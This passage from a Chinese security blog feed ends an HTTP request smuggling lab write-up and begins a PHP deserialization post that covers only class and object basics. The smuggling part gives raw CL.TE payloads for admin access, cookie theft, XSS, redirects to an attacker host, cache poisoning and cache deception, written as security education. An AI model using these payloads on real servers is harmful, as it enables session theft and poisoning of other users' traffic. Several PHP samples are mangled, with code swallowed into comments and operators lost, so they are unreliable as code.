<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200724151412.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200724151412.png" alt="img"></a></p>
<p>于是加入走私的请求，再尝试访问/admin发现成功</p>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200724151656.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200724151656.png" alt="img"></a></p>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200724152230.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200724152230.png" alt="img"></a></p>
<h3 id="获取其他用户的cookie"><a class="markdownIt-Anchor" href="#获取其他用户的cookie"></a> 获取其他用户的cookie</h3>
<p>参考上一个实验，这个实验也是通过获取HTTP HEADER来获取其他用户的Cookie。</p>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200724164032.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200724164032.png" alt="img"></a></p>
<h3 id="http-header导致的xss"><a class="markdownIt-Anchor" href="#http-header导致的xss"></a> HTTP header导致的XSS</h3>
<p><strong>场景</strong>：通常情况下，HTTP HEADER导致的XSS是不好利用的，但是通过HTTP走私请求，我们能够控制HTTP HEADER，进而就可以利用这类HTTP头导致的XSS。</p>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200724164602.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200724164602.png" alt="img"></a></p>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200724164644.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200724164644.png" alt="img"></a></p>
<h3 id="将重定向转变为任意重定向"><a class="markdownIt-Anchor" href="#将重定向转变为任意重定向"></a> 将重定向转变为任意重定向</h3>
<p><strong>场景</strong>：许多应用程序执行现场重定向，并将主机名从请求的Host标头放入重定向URL。</p>
<p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /home HTTP/1.1</span><br><span class="line">Host: normal-website.com</span><br><span class="line"></span><br><span class="line">HTTP/1.1 301 Moved Permanently</span><br><span class="line">Location: https://normal-website.com/home/</span><br></pre></td></tr></table></figure>
<p>通常，此行为被认为是无害的，但是可以在走私请求攻击中利用它来将其他用户重定向到外部域。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Length: 54</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /home HTTP/1.1</span><br><span class="line">Host: attacker-website.com</span><br><span class="line">Foo: X</span><br></pre></td></tr></table></figure>
<p>走私的请求将触发重定向到攻击者的网站，这将影响后端服务器处理的下一个用户的请求。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /home HTTP/1.1</span><br><span class="line">Host: attacker-website.com</span><br><span class="line">Foo: XGET /scripts/include.js HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line"></span><br><span class="line">HTTP/1.1 301 Moved Permanently</span><br><span class="line">Location: https://attacker-website.com/home/</span><br></pre></td></tr></table></figure>
<h3 id="缓存投毒"><a class="markdownIt-Anchor" href="#缓存投毒"></a> 缓存投毒</h3>
<ul>
<li>构造一个页面中写入恶意的内容，比如写入alert(document.cookie)</li>
<li>发送请求走私的内容</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: your-lab-id.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 129</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /post/next?postId=3 HTTP/1.1</span><br><span class="line">Host: anything</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 10</span><br><span class="line"></span><br><span class="line">x=1</span><br></pre></td></tr></table></figure>
<ul>
<li>再寻找到一个可用缓存的js页面（可用导致xss的js）访问。页面会跳转到恶意页面中，并且将恶意内容缓存到服务器上。</li>
<li>打开主页 ⇒ 导致xss</li>
</ul>
<h3 id="缓存欺骗"><a class="markdownIt-Anchor" href="#缓存欺骗"></a> 缓存欺骗</h3>
<p>缓存欺骗：在Web缓存欺骗中，攻击者使应用程序将一些属于另一个用户的敏感内容存储在缓存中，然后攻击者从缓存中检索此内容。</p>
<ul>
<li>寻找一个存在隐私的页面，比如这里的my-account，并且页面返回的内容是可以被缓存的</li>
<li>发送一个走私请求，下一个请求静态资源的请求会跳转到my-acount并把隐私信息缓存</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: your-lab-id.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 42</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /my-account HTTP/1.1</span><br><span class="line">X-Ignore: X</span><br></pre></td></tr></table></figure>
<ul>
<li>打开隐私浏览器加载主页，用Brupsuite搜索隐私内容的关键字。如果成功的话可以在静态资源中搜索到</li>
</ul>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200724173247.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200724173247.png" alt="img"></a></p>
<p>原理是走私的请求把下一个请求HTTP方法那一行注释，请求会变为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /private/messages HTTP/1.1</span><br><span class="line">Foo: XGET /static/some-image.png HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Cookie: sessionId=q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>技术总结</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP反序列化</title>
    <url>/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>PHP反序列化的学习总结，还有实践总结嗷QWQ</p>
<span id="more"></span>
<h1 id="反序列化漏洞"><a class="markdownIt-Anchor" href="#反序列化漏洞"></a> 反序列化漏洞</h1>
<p>​                                                                                                         --------------------------------<strong>TWe1v3</strong></p>
<h2 id="php类和对象详解"><a class="markdownIt-Anchor" href="#php类和对象详解"></a> PHP类和对象详解</h2>
<h3 id="一-php类和对象"><a class="markdownIt-Anchor" href="#一-php类和对象"></a> 一、PHP类和对象</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="comment">//定义一个类class Car &#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$name</span> = <span class="string">&#x27;手机&#x27;</span>;    <span class="function"><span class="keyword">function</span> <span class="title">getName</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="comment">//实例化一个car对象$car = new Car();$car-&gt;name = &#x27;iPhone&#x27;; </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//设置对象的属性值echo $car-&gt;getName();  //调用对象的方法 输出对象的名字</span></span><br></pre></td></tr></table></figure>
<h3 id="二-类的属性"><a class="markdownIt-Anchor" href="#二-类的属性"></a> 二、类的属性</h3>
<p>在类中定义的变量称之为属性，通常属性跟数据库中的字段有一定的关联，因此也可以称作“字段”。属性声明是由关键字 public，protected 或者 private 开头，后面跟一个普通的变量声明来组成。属性的变量可以设置初始化的默认值，默认值必须是常量。</p>
<p>访问控制的关键字代表的意义为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span>：公开的 <span class="keyword">protected</span>：受保护的 <span class="keyword">private</span>：私有的</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;    <span class="comment">//定义公共属性    public $name = &#x27;汽车&#x27;;   </span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//定义受保护的属性    protected $corlor = &#x27;白色&#x27;;    </span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//定义私有属性    private $price = &#x27;100000&#x27;;&#125;</span></span><br><span class="line"></span><br><span class="line">默认都为<span class="keyword">public</span>，外部可以访问。一般通过-&gt;对象操作符来访问对象的属性或者方法，对于静态属性则使用::双冒号进行访问。当在类成员方法内部调用的时候，可以使用<span class="variable language_">$this</span>伪变量调用当前对象的属性。</span><br><span class="line"></span><br><span class="line"><span class="variable">$car</span> = <span class="keyword">new</span> <span class="title class_">Car</span>();<span class="keyword">echo</span> <span class="variable">$car</span>-&gt;name;   </span><br><span class="line"></span><br><span class="line"><span class="comment">//调用对象的属性echo $car-&gt;color;  //错误 受保护的属性不允许外部调用echo $car-&gt;price;  //错误 私有属性不允许外部调用</span></span><br><span class="line"></span><br><span class="line">受保护的属性与私有属性不允许外部调用，在类的成员方法内部是可以调用的。</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span></span>&#123;    <span class="keyword">private</span> <span class="variable">$price</span> = <span class="string">&#x27;1000&#x27;</span>;    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPrice</span>(<span class="params"></span>) </span>&#123;        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;price; <span class="comment">//内部访问私有属性    &#125;&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="三-类的方法"><a class="markdownIt-Anchor" href="#三-类的方法"></a> 三、类的方法</h3>
<p>方法就是在类中的function，很多时候我们分不清方法与函数有什么差别，在面向过程的程序设计中function叫做函数，在面向对象中function则被称之为方法。</p>
<p>同属性一样，类的方法也具有public，protected 以及 private 的访问控制。</p>
<p>访问控制的关键字代表的意义为：<br>
public：公开的<br>
protected：受保护的<br>
private：私有的</p>
<p>可以这样定义方法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getName</span>(<span class="params"></span>) </span>&#123;        <span class="keyword">return</span> <span class="string">&#x27;汽车&#x27;</span>;    &#125;&#125;<span class="variable">$car</span> = <span class="keyword">new</span> <span class="title class_">Car</span>();<span class="keyword">echo</span> <span class="variable">$car</span>-&gt;<span class="title function_ invoke__">getName</span>();</span><br><span class="line"></span><br><span class="line">使用关键字<span class="built_in">static</span>修饰的，称之为静态方法，静态方法不需要实例化对象，可以通过类名直接调用，操作符为双冒号::。</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getName</span>(<span class="params"></span>) </span>&#123;        <span class="keyword">return</span> <span class="string">&#x27;汽车&#x27;</span>;    &#125;&#125;<span class="keyword">echo</span> <span class="title class_">Car</span>::<span class="title function_ invoke__">getName</span>(); <span class="comment">//结果为“汽车”</span></span><br></pre></td></tr></table></figure>
<h3 id="四-构造函数和析构函数"><a class="markdownIt-Anchor" href="#四-构造函数和析构函数"></a> 四、构造函数和析构函数</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP5可以在类中使用<span class="title function_ invoke__">__construct</span>()定义一个构造函数，具有构造函数的类，会在每次对象创建的时候调用该函数，因此常用来在对象创建的时候进行一些初始化工作。</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;       <span class="keyword">print</span> <span class="string">&quot;构造函数被调用\n&quot;</span>;   &#125;&#125;<span class="variable">$car</span> = <span class="keyword">new</span> <span class="title class_">Car</span>(); </span><br><span class="line"></span><br><span class="line"><span class="comment">//实例化的时候 会自动调用构造函数__construct，这里会输出一个字符串</span></span><br><span class="line"></span><br><span class="line">在子类中如果定义了__construct则不会调用父类的__construct，如果需要同时调用父类的构造函数，需要使用<span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>()显式的调用。</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;       <span class="keyword">print</span> <span class="string">&quot;父类构造函数被调用\n&quot;</span>;   &#125;&#125;<span class="class"><span class="keyword">class</span> <span class="title">Truck</span> <span class="keyword">extends</span> <span class="title">Car</span> </span>&#123;   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> </span>&#123;       <span class="keyword">print</span> <span class="string">&quot;子类构造函数被调用\n&quot;</span>;       <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>();   &#125;&#125;<span class="variable">$car</span> = <span class="keyword">new</span> <span class="title class_">Truck</span>();</span><br><span class="line"></span><br><span class="line">同样，PHP5支持析构函数，使用<span class="title function_ invoke__">__destruct</span>()进行定义，析构函数指的是当某个对象的所有引用被删除，或者对象被显式的销毁时会执行的函数。</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;       <span class="keyword">print</span> <span class="string">&quot;构造函数被调用 \n&quot;</span>;   &#125;   <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> </span>&#123;       <span class="keyword">print</span> <span class="string">&quot;析构函数被调用 \n&quot;</span>;   &#125;&#125;<span class="variable">$car</span> = <span class="keyword">new</span> <span class="title class_">Car</span>(); <span class="comment">//实例化时会调用构造函数echo &#x27;使用后，准备销毁car对象 \n&#x27;;unset($car); //销毁时会调用析构函数</span></span><br></pre></td></tr></table></figure>
<p>当PHP代码执行完毕以后，会自动回收与销毁对象，因此一般情况下不需要显式的去销毁对象。</p>
<h3 id="五-static静态关键字"><a class="markdownIt-Anchor" href="#五-static静态关键字"></a> 五、Static静态关键字</h3>
<p>静态属性与方法可以在不实例化类的情况下调用，直接使用类名::方法名的方式进行调用。静态属性不允许对象使用-&gt;操作符调用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$speed</span> = <span class="number">10</span>;    </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getSpeed</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$speed</span>;    &#125;&#125;<span class="keyword">echo</span> <span class="title class_">Car</span>::<span class="title function_ invoke__">getSpeed</span>();  <span class="comment">//调用静态方法</span></span><br><span class="line"></span><br><span class="line">静态方法也可以通过变量来进行动态调用</span><br><span class="line"></span><br><span class="line"><span class="variable">$func</span> = <span class="string">&#x27;getSpeed&#x27;</span>;<span class="variable">$className</span> = <span class="string">&#x27;Car&#x27;</span>;<span class="keyword">echo</span> <span class="variable">$className</span>::<span class="variable">$func</span>();  <span class="comment">//动态调用静态方法</span></span><br></pre></td></tr></table></figure>
<p>静态方法中，$this伪变量不允许使用。可以使用self，parent，static在内部调用静态方法与属性。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$speed</span> = <span class="number">10</span>;    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getSpeed</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$speed</span>;</span><br><span class="line"></span><br><span class="line">    &#125;    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">speedUp</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$speed</span>+=<span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="class"><span class="keyword">class</span> <span class="title">BigCar</span> <span class="keyword">extends</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">parent</span>::<span class="title function_ invoke__">speedUp</span>();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">BigCar</span>::<span class="title function_ invoke__">start</span>();<span class="keyword">echo</span> <span class="title class_">BigCar</span>::<span class="title function_ invoke__">getSpeed</span>();</span><br></pre></td></tr></table></figure>
<h3 id="六-访问控制"><a class="markdownIt-Anchor" href="#六-访问控制"></a> 六、访问控制</h3>
<p>访问控制通过关键字public，protected和private来实现。被定义为公有的类成员可以在任何地方被访问。被定义为受保护的类成员则可以被其自身以及其子类和父类访问。被定义为私有的类成员则只能被其定义所在的类访问。</p>
<p>类属性必须定义为公有、受保护、私有之一。为兼容PHP5以前的版本，如果采用 var 定义，则被视为公有。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$speed</span> = <span class="number">10</span>; <span class="comment">//错误 属性必须定义访问控制</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$name</span>;   <span class="comment">//定义共有属性&#125;</span></span><br><span class="line"></span><br><span class="line">类中的方法可以被定义为公有、私有或受保护。如果没有设置这些关键字，则该方法默认为公有</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//默认为共有方法</span></span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">turnLeft</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">如果构造函数定义成了私有方法，则不允许直接实例化对象了，这时候一般通过静态方法进行实例化，在设计模式中会经常使用这样的方法来控制对象的创建，比如单例模式只允许有一个全局唯一的对象。</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;object create&#x27;</span>;</span><br><span class="line"></span><br><span class="line">   &#125;    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$_object</span> = <span class="literal">null</span>;    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getInstance</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="built_in">self</span>::<span class="variable">$_object</span>)) &#123;            <span class="built_in">self</span>::<span class="variable">$_object</span> = <span class="keyword">new</span> <span class="title class_">Car</span>(); <span class="comment">//内部方法可以调用私有方法，因此这里可以创建对象</span></span><br><span class="line"></span><br><span class="line">       &#125;        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$_object</span>;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="comment">//$car = new Car(); //这里不允许直接实例化对象$car = Car::getInstance(); //通过静态方法来获得一个实例</span></span><br></pre></td></tr></table></figure>
<h3 id="七-对象继承"><a class="markdownIt-Anchor" href="#七-对象继承"></a> 七、对象继承</h3>
<p>继承是面向对象程序设计中常用的一个特性，汽车是一个比较大的类，我们也可以称之为基类，除此之外，汽车还分为卡车、轿车、东风、宝马等，因为这些子类具有很多相同的属性和方法，可以采用继承汽车类来共享这些属性与方法，实现代码的复用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$speed</span> = <span class="number">0</span>; <span class="comment">//汽车的起始速度是0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">speedUp</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;speed += <span class="number">10</span>;        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;speed;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="comment">//定义继承于Car的Truck类class Truck extends Car&#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">speedUp</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;speed = <span class="built_in">parent</span>::<span class="title function_ invoke__">speedUp</span>() + <span class="number">50</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="八-重载"><a class="markdownIt-Anchor" href="#八-重载"></a> 八、重载</h3>
<p>PHP中的重载指的是动态的创建属性与方法，是通过魔术方法来实现的。属性的重载通过__set，__get，__isset，__unset来分别实现对不存在属性的赋值、读取、判断属性是否设置、销毁属性。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="variable">$ary</span> = <span class="keyword">array</span>();    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$val</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="variable language_">$this</span>-&gt;ary[<span class="variable">$key</span>] = <span class="variable">$val</span>;</span><br><span class="line"></span><br><span class="line">   &#125;    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;ary[<span class="variable">$key</span>])) &#123;            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;ary[<span class="variable">$key</span>];</span><br><span class="line"></span><br><span class="line">       &#125;        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">   &#125;    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;ary[<span class="variable">$key</span>])) &#123;            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">       &#125;        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">   &#125;    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;ary[<span class="variable">$key</span>]);</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="variable">$car</span> = <span class="keyword">new</span> <span class="title class_">Car</span>();<span class="variable">$car</span>-&gt;name = <span class="string">&#x27;汽车&#x27;</span>;  <span class="comment">//name属性动态创建并赋值echo $car-&gt;name;</span></span><br><span class="line"></span><br><span class="line">方法的重载通过__call来实现，当调用不存在的方法的时候，将会转为参数调用__call方法，当调用不存在的静态方法时会使用__callStatic重载。</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$speed</span> = <span class="number">0</span>;    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$name</span> == <span class="string">&#x27;speedUp&#x27;</span>) &#123;            <span class="variable language_">$this</span>-&gt;speed += <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="variable">$car</span> = <span class="keyword">new</span> <span class="title class_">Car</span>();<span class="variable">$car</span>-&gt;<span class="title function_ invoke__">speedUp</span>(); <span class="comment">//调用不存在的方法会使用重载echo $car-&gt;speed;</span></span><br></pre></td></tr></table></figure>
<h3 id="十-对象比较"><a class="markdownIt-Anchor" href="#十-对象比较"></a> 十、对象比较</h3>
<p>，当同一个类的两个实例的所有属性都相等时，可以使用比较运算符<mark>进行判断，当需要判断两个变量是否为同一个对象的引用时，可以使用全等运算符</mark>=进行判断。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;&#125;<span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Car</span>();<span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Car</span>();<span class="keyword">if</span> (<span class="variable">$a</span> == <span class="variable">$b</span>) <span class="keyword">echo</span> <span class="string">&#x27;==&#x27;</span>;   <span class="comment">//trueif ($a === $b) echo &#x27;===&#x27;; //false</span></span><br><span class="line"></span><br><span class="line">对象复制，在一些特殊情况下，可以通过关键字<span class="keyword">clone</span>来复制一个对象，这时__clone方法会被调用，通过这个魔术方法来设置属性的值。</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;car&#x27;</span>;    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">Car</span>();        <span class="variable">$obj</span>-&gt;name = <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Car</span>();<span class="variable">$a</span>-&gt;name = <span class="string">&#x27;new car&#x27;</span>;<span class="variable">$b</span> = <span class="keyword">clone</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line">对象序列化，可以通过serialize方法将对象序列化为字符串，用于存储或者传递数据，然后在需要的时候通过unserialize将字符串反序列化成对象进行使用</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;car&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;<span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Car</span>();<span class="variable">$str</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>); <span class="comment">//对象序列化成字符串echo $str.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;;$b = unserialize($str); //反序列化为对象var_dump($b);</span></span><br></pre></td></tr></table></figure>
<h2 id="反序列化"><a class="markdownIt-Anchor" href="#反序列化"></a> 反序列化</h2>
<h3 id="一-基本知识"><a class="markdownIt-Anchor" href="#一-基本知识"></a> 一、基本知识</h3>
<h4 id="~类和对象"><a class="markdownIt-Anchor" href="#~类和对象"></a> ~类和对象</h4>
